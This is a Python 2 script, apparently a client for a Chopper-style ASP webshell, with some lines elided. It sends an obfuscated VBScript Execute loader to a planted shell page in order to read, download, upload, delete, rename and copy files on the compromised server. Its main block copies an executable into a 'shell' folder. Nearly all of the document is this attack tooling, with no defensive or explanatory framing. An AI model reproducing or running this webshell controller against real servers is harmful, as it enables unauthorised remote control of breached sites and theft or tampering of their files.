...
shell = "http://localhost:88/x1.asp"
class aspshell:
    pass
...
class FileManage:
    ...
    def GetFilePath(self, path):
       ...
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd("""""""")):Response.End"")")
        '''.strip()        
        payload = {"w":code, "z1":self.toHex(path.replace("\\", "\\\\"))}  # 这个z1需要十六机制加密
        data = Spider.post(payload)
    ...
    def DeleteFile(self, path):
       ...
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd("""""""")):Response.End"")")
        '''.strip()
        payload = {"w":code, "z1":path.replace("\\", "\\\\")}   # 这个z1需要url编码
        data = Spider.post(payload)
        if "1" in data:
            print "delete ok!"
    ...
    def UploadFile(self, remotepath, localfile):
       ...
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd("""""""")):Response.End"")")
        ...
        payload = {"w":code, "z1":self.toHex(remotepath.replace("\\", "\\\\")), 'z2':filestream, 'z3':0}
        data = Spider.post(payload)
        if "1" in data:
            print "upload ok!"
    ...
    def RenameFile(self,oldname, newname):
       ...
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd("""""""")):Response.End"")")
        ...
        payload = {"w":code, "z1":oldname.replace("\\", "\\\\"), 'z2':newname.replace("\\", "\\\\")}   # 这个z1需要url编码
        data = Spider.post(payload)
        if "1" in data:
            print "rename ok!"
    ...
    def CopyFile(self, sourcepath, descpath):
       ...
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd("""""""")):Response.End"")")
        ...
        payload = {"w":code, "z1":sourcepath.replace("\\", "\\\\"), 'z2':descpath}
        data = Spider.post(payload)
        if "1" in data:
            print "copy ok!"
    ...
    def ReadFile(self, file):
       ...
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd("""""""")):Response.End"")")
        '''.strip()
        payload = {"w":code, "z1":self.toHex(file.replace("\\", "\\\\"))}   # 这个z1需要hex编码
        data = Spider.post(payload)
        print data
    ...
    def DownloadFile(self,remotefile, localpath):
       ...
       eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Ex"&cHr(101)&"cute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd("""""""")):Response.End"")")
        '''.strip()
        suffix =  localpath + remotefile[remotefile.rfind("\\")+1:]
        payload = {"w":code, "z1":remotefile.replace("\\", "\\\\")}   # 这个z1需要hex编码
        data = Spider.post(payload)
        if "ERROR" in data:
            print "download error"
        else:
            self.filesave(data, suffix)
            print "download ok"
    ...
    def showrwx(self, num):
        permx = {0:'---', 1:'rwx', 2:'rwx', 4:'rwx',16:'r--' , 32:"rwx",1024:'r--' , 2048:'r--'}
...
if __name__ == '__main__':
    t = FileManage()
    t.CopyFile("E:\\web\\web\\1\\2.exe", "C:\\Users\\Root\\Desktop\\shell\\")
